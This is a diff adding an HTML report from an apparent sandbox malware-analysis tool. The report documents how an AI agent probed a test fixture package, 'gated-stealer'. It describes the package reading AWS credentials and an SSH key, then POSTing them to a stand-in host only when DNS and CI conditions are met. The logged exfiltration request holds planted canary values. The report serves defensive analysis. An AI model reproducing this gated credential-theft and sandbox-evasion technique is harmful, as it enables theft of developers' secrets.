@@ -1,0 +1,456 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sandtrap report - fixtures/gated-stealer</title><style>
+:root{--bg:#f6f7f9;--fg:#15181d;--muted:#5b6470;--card:#fff;--line:#d9dde3;--code:#eef0f3;
+--clean:#0f7b3f;--susp:#8a5a00;--mal:#b3261e;--inc:#4b5563;--add:#d9f4e0;--del:#fde0de;--accent:#1d4ed8;--lure:#fff1e6}
+@media(prefers-color-scheme:dark){:root{--bg:#0f1216;--fg:#e8ebef;--muted:#9aa4b0;--card:#181c22;--line:#2b323b;--code:#222830;
+--clean:#4ade80;--susp:#fbbf24;--mal:#ff7b72;--inc:#a3acb8;--add:#12331f;--del:#43181a;--accent:#7aa2ff;--lure:#3a2412}}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+main{max-width:1100px;margin:0 auto;padding:16px}h1{font-size:1.4rem;margin:.2em 0}h2{display:inline;font-size:1.1rem}h4{margin:.8em 0 .2em}
+.muted{color:var(--muted);font-size:.85em}.empty{color:var(--muted);font-style:italic}
+code,pre{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:.85em}
+pre{background:var(--code);padding:8px;border-radius:6px;overflow:auto;white-space:pre-wrap;word-break:break-word;max-height:360px;margin:4px 0}
+code{background:var(--code);padding:1px 4px;border-radius:4px;word-break:break-all}
+.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 16px;margin:14px 0}
+.card>summary{cursor:pointer;margin-bottom:8px}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:6px 16px;margin:0}
+.meta dt{color:var(--muted);font-size:.8em;text-transform:uppercase}.meta dd{margin:0 0 6px;word-break:break-all}
+.hero{display:flex;flex-wrap:wrap;gap:16px;align-items:center}
+.badge{border:3px solid currentColor;border-radius:14px;padding:12px 22px;font-weight:800;font-size:2rem;letter-spacing:.04em;text-transform:uppercase}
+.badge small{display:block;font-size:.8rem;font-weight:600;letter-spacing:0;text-transform:none}
+.v-clean{color:var(--clean)}.v-suspicious{color:var(--susp)}.v-malicious{color:var(--mal)}.v-inconclusive{color:var(--inc)}
+.gauge{flex:1;min-width:200px}.bar{height:14px;border-radius:7px;background:var(--code);overflow:hidden;border:1px solid var(--line)}
+.bar i{display:block;height:100%;background:currentColor}
+.chip{display:inline-block;padding:1px 8px;border-radius:999px;font-size:.78em;font-weight:700;border:1px solid currentColor;margin:1px}
+.sev-high,.proof-proof{color:var(--mal)}.sev-medium,.proof-intent{color:var(--susp)}.sev-low,.proof-signal{color:var(--inc)}
+.kind{color:var(--accent);font-weight:500}.lure{color:var(--susp)}
+a.attack{color:var(--accent);font-weight:600;margin-right:6px}
+.timeline,.stepper{list-style:none;padding:0;margin:0}.timeline li{display:flex;gap:10px;padding:6px 0;border-left:2px solid var(--line);margin-left:6px;padding-left:12px;position:relative}
+.timeline .dot{position:absolute;left:-7px;top:12px;width:12px;height:12px;border-radius:50%;background:var(--accent)}
+.timeline .hyp .dot{background:var(--susp)}.timeline .sum .dot{background:var(--clean)}.timeline p{margin:2px 0}
+.diffwrap{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.col{border:2px solid var(--line);border-radius:10px;padding:10px}.col.lure{border-color:var(--mal);background:var(--lure)}
+.col h3{margin:0 0 6px;font-size:1rem}.col ul{margin:0;padding-left:18px}
+.caption{font-weight:700;margin:10px 0 0;color:var(--mal)}
+.stepper li{display:flex;gap:12px;padding:8px 0;border-bottom:1px dashed var(--line)}
+.step{flex:none;width:28px;height:28px;border-radius:50%;background:var(--accent);color:var(--card);display:grid;place-items:center;font-weight:700}
+.rules{margin:4px 0;padding-left:18px}
+table.grid{width:100%;border-collapse:collapse}.grid th,.grid td{text-align:left;vertical-align:top;padding:6px 8px;border-bottom:1px solid var(--line)}
+.grid th{font-size:.8em;text-transform:uppercase;color:var(--muted)}
+.diff .dl{display:block}.diff .add{background:var(--add)}.diff .del{background:var(--del)}.diff .hunk{color:var(--accent)}
+.tools{text-align:right}button{font:inherit;padding:4px 10px;border-radius:6px;border:1px solid var(--line);background:var(--card);color:var(--fg);cursor:pointer}
+footer{color:var(--muted);font-size:.85em;margin:20px 0}
+@media(max-width:700px){.diffwrap{grid-template-columns:1fr}.badge{font-size:1.5rem}
+table.grid thead{display:none}.grid tr{display:block;border-bottom:2px solid var(--line);padding:6px 0}
+.grid td{display:block;border:0;padding:2px 0}.grid td::before{content:attr(data-l) ": ";color:var(--muted);font-size:.8em}}
+</style></head><body><main><h1>Sandtrap report</h1><div class="tools"><button id="ex" type="button">Expand all</button> <button id="co" type="button">Collapse all</button></div><section class="card"><dl class="meta"><dt>Target</dt><dd>fixtures/gated-stealer (package)</dd><dt>Job</dt><dd>005a10c41b</dd><dt>Created</dt><dd>2026-10-20T09:06:16+00:00</dd><dt>SHA-256</dt><dd>f5ea025f79988eb7ff82d8e388c731380986c7856541d31073724e28533b2f49</dd><dt>Model</dt><dd>gemini-3.5-flash (6 calls)</dd><dt>Capture method</dt><dd>strace</dd></dl></section><section class="card"><div class="hero"><div class="badge v-malicious" role="status">✗ malicious<small>Malicious behaviour demonstrated<br>proof level: proof &middot; confidence: high</small></div><div class="gauge v-malicious"><b>Risk score 100/100</b><div class="bar" role="meter" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><i style="width:100%"></i></div></div></div></section><details class="card" open><summary><h2>What the agent did</h2></summary><ol class="timeline"><li><span class="dot"></span><div><b>Round 0: baseline</b> <span class="muted">exit 0</span><p>default import driver</p></div></li><li><span class="dot"></span><div><b>Round 1: probe-1</b> <span class="muted">exit 0</span><p>The package requires both successful DNS resolution of telemetry.cdn-metrics.example and the CI environment variable to be set to exfiltrate credentials.</p></div></li><li><span class="dot"></span><div><b>Round 2: probe-2</b> <span class="muted">exit 0</span><p>The package requires both successful DNS resolution of telemetry.cdn-metrics.example and the CI environment variable to be set to exfiltrate credentials.</p></div></li><li class="hyp"><span class="dot"></span><div><b>Hypothesis</b><p>The package requires both successful DNS resolution of telemetry.cdn-metrics.example and the CI environment variable to be set to exfiltrate credentials.</p></div></li><li class="sum"><span class="dot"></span><div><b>Summary</b><p>The `gatedstealer` package is a credential harvester that targets AWS credentials (~/.aws/credentials) and SSH private keys (~/.ssh/id_rsa). Its execution is gated by two conditions: successful DNS resolution of the domain `telemetry.cdn-metrics.example` and the presence of the `CI` environment variable. When both conditions are met, it reads the sensitive files and exfiltrates them via an HTTP POST request to `http://telemetry.cdn-metrics.example/collect`.</p></div></li></ol></details><details class="card" open><summary><h2>Baseline vs Lure diff</h2></summary><div class="diffwrap"><div class="col"><h3>Baseline only</h3><ul><li class="empty">nothing unique to baseline</li></ul></div><div class="col lure"><h3>Lure only</h3><ul><li><code>file_read_sensitive:/root/.aws/credentials</code></li><li><code>file_read_sensitive:/root/.ssh/id_rsa</code></li><li><code>sink_request:telemetry.cdn-metrics.example</code></li></ul></div></div><p class="caption">behaviour that appeared only after the agent changed the environment = evidence of sandbox evasion</p></details><details class="card" open><summary><h2>Findings</h2></summary><table class="grid"><thead><tr><th>Finding</th><th>Severity</th><th>Proof</th><th>ATT&amp;CK</th><th>Evidence</th></tr></thead><tbody><tr><td data-l="Finding"><b>Outbound network attempt to non-registry host</b><div class="muted">outbound</div></td><td data-l="Severity"><span class="chip sev-medium">medium</span></td><td data-l="Proof"><span class="chip proof-signal">signal</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1071/001/" target="_blank" rel="noopener noreferrer" title="Web Protocols">T1071.001</a></td><td data-l="Evidence"><pre class="ev">round 0 / event 1
+dns_query:telemetry.cdn-metrics.example</pre><pre class="ev">round 1 / event 1
+dns_query:telemetry.cdn-metrics.example</pre></td></tr><tr><td data-l="Finding"><b>Canary credentials exfiltrated</b><div class="muted">canary_exfil</div></td><td data-l="Severity"><span class="chip sev-high">high</span></td><td data-l="Proof"><span class="chip proof-proof">proof</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1041/" target="_blank" rel="noopener noreferrer" title="Exfiltration Over C2 Channel">T1041</a> <a class="attack" href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" rel="noopener noreferrer" title="Credentials In Files">T1552.001</a> <a class="attack" href="https://attack.mitre.org/techniques/T1552/004/" target="_blank" rel="noopener noreferrer" title="Private Keys">T1552.004</a></td><td data-l="Evidence"><pre class="ev">round 2 / event 5
+sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRPa34f5573,SNDTRP-a34f5573-AWS,SNDTRP-a34f5573-SSH</pre></td></tr><tr><td data-l="Finding"><b>Credential file read followed by outbound attempt</b><div class="muted">cred_read_outbound</div></td><td data-l="Severity"><span class="chip sev-high">high</span></td><td data-l="Proof"><span class="chip proof-intent">intent</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1041/" target="_blank" rel="noopener noreferrer" title="Exfiltration Over C2 Channel">T1041</a> <a class="attack" href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" rel="noopener noreferrer" title="Credentials In Files">T1552.001</a> <a class="attack" href="https://attack.mitre.org/techniques/T1552/004/" target="_blank" rel="noopener noreferrer" title="Private Keys">T1552.004</a></td><td data-l="Evidence"><pre class="ev">round 2 / event 0
+file_read_sensitive:/root/.aws/credentials</pre><pre class="ev">round 2 / event 1
+file_read_sensitive:/root/.ssh/id_rsa</pre><pre class="ev">round 2 / event 2
+dns_query:telemetry.cdn-metrics.example</pre><pre class="ev">round 2 / event 3
+dns_query:telemetry.cdn-metrics.example</pre><pre class="ev">round 2 / event 4
+dns_query:telemetry.cdn-metrics.example</pre><pre class="ev">round 2 / event 5
+sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRPa34f5573,SNDTRP-a34f5573-AWS,SNDTRP-a34f5573-SSH</pre></td></tr><tr><td data-l="Finding"><b>Behaviour only appears under lure (sandbox evasion)</b><div class="muted">lure_only</div></td><td data-l="Severity"><span class="chip sev-high">high</span></td><td data-l="Proof"><span class="chip proof-proof">proof</span></td><td data-l="ATT&amp;CK"><a class="attack" href="https://attack.mitre.org/techniques/T1497/" target="_blank" rel="noopener noreferrer" title="Virtualization/Sandbox Evasion">T1497</a></td><td data-l="Evidence"><pre class="ev">round 2 / event 0
+file_read_sensitive:/root/.aws/credentials</pre><pre class="ev">round 2 / event 1
+file_read_sensitive:/root/.ssh/id_rsa</pre><pre class="ev">round 2 / event 5
+sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRPa34f5573,SNDTRP-a34f5573-AWS,SNDTRP-a34f5573-SSH</pre></td></tr></tbody></table></details><details class="card" ><summary><h2>Static findings</h2></summary><p class="empty">No static findings.</p></details><details class="card" open><summary><h2>Egress firewall timeline</h2></summary><ol class="stepper"><li><span class="step">1</span><div><b>create</b><ul class="rules"><li><code>pypi.org:443</code></li><li><code>files.pythonhosted.org:443</code></li><li><code>registry.npmjs.org:443</code></li></ul><p class=muted>sandbox sb-01m5c8tb5pfmcrd1e2ha8t4d4f</p></div></li><li><span class="step">2</span><div><b>analysis</b><ul class="rules"><li><code>192.0.2.1:9</code></li></ul><p class=muted>registry access closed; lure runs on loopback only</p></div></li></ol></details><details class="card" ><summary><h2>Probe rounds</h2></summary><table class="grid"><thead><tr><th>Round</th><th>Label</th><th>Exit</th><th>Duration</th><th>Events</th><th>Raw</th></tr></thead><tbody><tr><td data-l="Round">-1</td><td data-l="Label">install</td><td data-l="Exit">0</td><td data-l="Duration">0 ms</td><td data-l="Events"><span class="chip kind">exec ×17</span> <span class="chip kind">sleep ×4</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.354,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.356,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;bash&quot;,
+    &quot;/usr/local/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.358,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;asdf&quot;,
+    &quot;exec&quot;,
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.367,
+  &quot;pid&quot;: 660,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;env&quot;,
+    &quot;-0&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.369,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.374,
+  &quot;pid&quot;: 654,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.386,
+  &quot;pid&quot;: 651,
+  &quot;kind&quot;: &quot;sleep&quot;,
+  &quot;data&quot;: {
+   &quot;seconds&quot;: 30.0
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.386,
+  &quot;pid&quot;: 651,
+  &quot;kind&quot;: &quot;sleep&quot;,
+  &quot;data&quot;: {
+   &quot;seconds&quot;: 30.0
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.412,
+  &quot;pid&quot;: 663,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/__pip-runner__.py&quot;,
+    &quot;install&quot;,
+    &quot;--ignore-installed&quot;,
+    &quot;--no-user&quot;,
+    &quot;--prefix&quot;,
+    &quot;/tmp/pip-build-env-siw73es1/overlay&quot;,
+    &quot;--no-warn-script-location&quot;,
+    &quot;--disable-pip-version-check&quot;,
+    &quot;--no-compile&quot;,
+    &quot;--target&quot;,
+    &quot;&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.758,
+  &quot;pid&quot;: 665,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;uname&quot;,
+    &quot;-rs&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.766,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.767,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;bash&quot;,
+    &quot;/usr/local/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.77,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;asdf&quot;,
+    &quot;exec&quot;,
+    &quot;rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.779,
+  &quot;pid&quot;: 671,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;env&quot;,
+    &quot;-0&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.78,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.786,
+  &quot;pid&quot;: 666,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc&quot;,
+    &quot;--version&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.797,
+  &quot;pid&quot;: 663,
+  &quot;kind&quot;: &quot;sleep&quot;,
+  &quot;data&quot;: {
+   &quot;seconds&quot;: 31.0
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 0.797,
+  &quot;pid&quot;: 663,
+  &quot;kind&quot;: &quot;sleep&quot;,
+  &quot;data&quot;: {
+   &quot;seconds&quot;: 31.0
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 1.407,
+  &quot;pid&quot;: 675,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;,
+    &quot;get_requires_for_build_wheel&quot;,
+    &quot;/tmp/tmpu20lm82d&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 1.803,
+  &quot;pid&quot;: 676,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py&quot;,
+    &quot;prepare_metadata_for_build_wheel&quot;,
+    &quot;/tmp/tmpt1nvm3fv&quot;
+   ],
+   &quot;suspicious&quot;: false
+  },
+  &quot;round&quot;: -1
+ },
+ {
+  &quot;t&quot;: 2.043,
+  &quot;pid&quot;: 677,
+  &quot;kind&quot;: &quot;exec&quot;,
+  &quot;data&quot;: {
+   &quot;argv&quot;: [
+    &quot;/root/work/venv/bin/python3&quot;,
+    &quot;/root/work/venv/lib/py
+… [truncated, 174 more characters]</pre><h4>stdout</h4><pre>Processing ./root/work/pkg
+  Installing build dependencies: started
+  Installing build dependencies: finished with status &#x27;done&#x27;
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status &#x27;done&#x27;
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status &#x27;done&#x27;
+Building wheels for collected packages: gated-stealer
+  Building wheel for gated-stealer (pyproject.toml): started
+  Building wheel for gated-stealer (pyproject.toml): finished with status &#x27;done&#x27;
+  Created wheel for gated-stealer: filename=gated_stealer-0.1.0-py3-none-any.whl size=2057 sha256=d55a52949d1701b72a9f602050d2cccb4c7727329babf5dc54702ab1afb433d1
+  Stored in directory: /tmp/pip-ephem-wheel-cache-e4nvu8oe/wheels/13/25/4d/8bd974f2a5e81e37fcc7c028cb3bf8fa1d4ca10e8b1484c5b0
+Successfully built gated-stealer
+Installing collected packages: gated-stealer
+Successfully installed gated-stealer-0.1.0
+</pre><h4>stderr</h4><pre></pre></details></td></tr><tr><td data-l="Round">0</td><td data-l="Label">baseline</td><td data-l="Exit">0</td><td data-l="Duration">1384 ms</td><td data-l="Events"><span class="chip kind">dns_query ×1</span> <span class="chip kind">gate_exit ×1</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.087,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;gate_exit&quot;,
+  &quot;data&quot;: {
+   &quot;reason&quot;: &quot;exited 0 after 0.1s with no observable behaviour&quot;
+  },
+  &quot;round&quot;: 0
+ },
+ {
+  &quot;t&quot;: 0.139,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;answered&quot;: false
+  },
+  &quot;round&quot;: 0
+ }
+]</pre><h4>stdout</h4><pre>imported gatedstealer
+</pre><h4>stderr</h4><pre></pre></details></td></tr><tr><td data-l="Round">1</td><td data-l="Label">probe-1 <span class="chip lure">lure</span></td><td data-l="Exit">0</td><td data-l="Duration">1421 ms</td><td data-l="Events"><span class="chip kind">dns_query ×1</span> <span class="chip kind">gate_exit ×1</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.084,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;gate_exit&quot;,
+  &quot;data&quot;: {
+   &quot;reason&quot;: &quot;exited 0 after 0.1s with no observable behaviour&quot;
+  },
+  &quot;round&quot;: 1
+ },
+ {
+  &quot;t&quot;: 0.134,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;answered&quot;: true
+  },
+  &quot;round&quot;: 1
+ }
+]</pre><h4>stdout</h4><pre>imported gatedstealer
+</pre><h4>stderr</h4><pre></pre></details></td></tr><tr><td data-l="Round">2</td><td data-l="Label">probe-2 <span class="chip lure">lure</span></td><td data-l="Exit">0</td><td data-l="Duration">1440 ms</td><td data-l="Events"><span class="chip kind">dns_query ×3</span> <span class="chip kind">file_read_sensitive ×2</span> <span class="chip kind">sink_request ×1</span></td><td data-l="Raw"><details><summary>raw events / stdout / stderr</summary><h4>events</h4><pre>[
+ {
+  &quot;t&quot;: 0.073,
+  &quot;pid&quot;: 760,
+  &quot;kind&quot;: &quot;file_read_sensitive&quot;,
+  &quot;data&quot;: {
+   &quot;path&quot;: &quot;/root/.aws/credentials&quot;,
+   &quot;canary&quot;: &quot;AWS&quot;
+  },
+  &quot;round&quot;: 2
+ },
+ {
+  &quot;t&quot;: 0.074,
+  &quot;pid&quot;: 760,
+  &quot;kind&quot;: &quot;file_read_sensitive&quot;,
+  &quot;data&quot;: {
+   &quot;path&quot;: &quot;/root/.ssh/id_rsa&quot;,
+   &quot;canary&quot;: &quot;SSH&quot;
+  },
+  &quot;round&quot;: 2
+ },
+ {
+  &quot;t&quot;: 0.134,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;answered&quot;: true
+  },
+  &quot;round&quot;: 2
+ },
+ {
+  &quot;t&quot;: 0.157,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;answered&quot;: true
+  },
+  &quot;round&quot;: 2
+ },
+ {
+  &quot;t&quot;: 0.157,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;dns_query&quot;,
+  &quot;data&quot;: {
+   &quot;name&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;answered&quot;: false
+  },
+  &quot;round&quot;: 2
+ },
+ {
+  &quot;t&quot;: 0.158,
+  &quot;pid&quot;: 0,
+  &quot;kind&quot;: &quot;sink_request&quot;,
+  &quot;data&quot;: {
+   &quot;host&quot;: &quot;telemetry.cdn-metrics.example&quot;,
+   &quot;method&quot;: &quot;POST&quot;,
+   &quot;path&quot;: &quot;/collect&quot;,
+   &quot;body&quot;: &quot;{\&quot;aws\&quot;: \&quot;[default]\\naws_access_key_id = AKIASNDTRPa34f5573\\naws_secret_access_key = SNDTRP-a34f5573-AWS/fake/secret/not/real\\n\&quot;, \&quot;ssh\&quot;: \&quot;-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nSNDTRP-a34f5573-SSH\\nQyNTUxOQAAACBzbmR0cnBjYW5hcnlrZXlub3RyZWFsbm90cmVhbG5vdHJlYWwAAAAAAAAA\\n-----END OPENSSH PRIVATE KEY-----\\n\&quot;}&quot;,
+   &quot;canaries&quot;: [
+    &quot;AKIASNDTRPa34f5573&quot;,
+    &quot;SNDTRP-a34f5573-AWS&quot;,
+    &quot;SNDTRP-a34f5573-SSH&quot;
+   ],
+   &quot;orig_dst&quot;: &quot;&quot;
+  },
+  &quot;round&quot;: 2
+ }
+]</pre><h4>stdout</h4><pre>imported gatedstealer
+</pre><h4>stderr</h4><pre></pre></details></td></tr></tbody></table></details><details class="card" open><summary><h2>Threat memory</h2></summary><ul><li>known indicator telemetry.cdn-metrics.example (seen in 4 earlier scans, last verdict malicious)</li><li>Skill from an earlier scan tried first: <b>dns-and-ci-gated-stealer</b></li><li>Skill from an earlier scan tried first: <b>ci-and-dns-gated-exfiltration</b></li><li>New skill learned from this scan: <b>dns-and-ci-gated-credential-stealer</b></li></ul></details><details class="card" open><summary><h2>Limitations</h2></summary><ul><li>Dynamic analysis runs on Linux only; Windows executables are not executed.</li><li>HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.</li><li>Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.</li><li>Canary proof covers the credential types we plant (ssh key, aws, npm, .env).</li></ul></details><footer>Sandboxes: sb-01m5c8tb5pfmcrd1e2ha8t4d4f &middot; sandbox destroyed: yes</footer></main><script>function t(o){document.querySelectorAll('details.card').forEach(function(d){d.open=o})}document.getElementById('ex').onclick=function(){t(true)};document.getElementById('co').onclick=function(){t(false)};</script></body></html>
